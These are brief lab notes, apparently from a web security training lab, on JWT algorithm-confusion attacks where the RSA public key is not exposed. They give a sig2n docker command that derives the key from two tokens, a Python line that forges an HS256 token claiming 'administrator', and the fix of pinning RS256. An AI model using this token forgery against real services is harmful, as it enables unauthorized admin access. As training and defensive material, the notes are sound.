# Lab 8 — Algorithm Confusion, No Exposed Key (EXPERT)

## Extra Step vs Lab 7
RSA public key not exposed → derive it from two tokens using sig2n.

## Key Derivation
```bash
docker run --rm portswigger/sig2n <JWT1> <JWT2>
```

## Then: same algorithm confusion as Lab 7
```python
jwt.encode({"sub":"administrator"}, DERIVED_PEM, algorithm="HS256")
```

## Fix
`algorithms=["RS256"]` — algorithm confusion closed regardless of key knowledge.
